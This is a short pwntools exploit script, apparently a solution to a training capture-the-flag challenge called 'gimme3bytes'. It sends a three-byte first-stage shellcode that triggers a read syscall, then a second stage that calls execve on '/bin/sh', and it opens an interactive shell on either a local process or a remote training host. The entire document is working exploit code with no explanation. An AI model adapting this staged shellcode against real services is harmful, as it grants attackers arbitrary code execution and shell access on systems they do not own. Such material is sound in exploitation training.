from pwn import *

context.update(arch='amd64', os='linux')
context.terminal=['tmux','splitw','-h']
stage1="""
pop rdx
syscall
"""
shell=asm(stage1)

shell2="nop\n" *len(stage1)+f"""
push rsi
pop rdi
add rdi,{len(stage1)+ int(0x15)}
mov rax,0x3b
xor rsi,rsi
xor rdx,rdx
syscall
"""

shell2=asm(shell2)+b"/bin/sh\x00"

if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 2004)

else:
    p=process("./gimme3bytes")
    gdb.attach(p,"""
    #b play
    """)

input("wait")

p.send(shell)

input("wait")

p.send(shell2)

p.interactive()
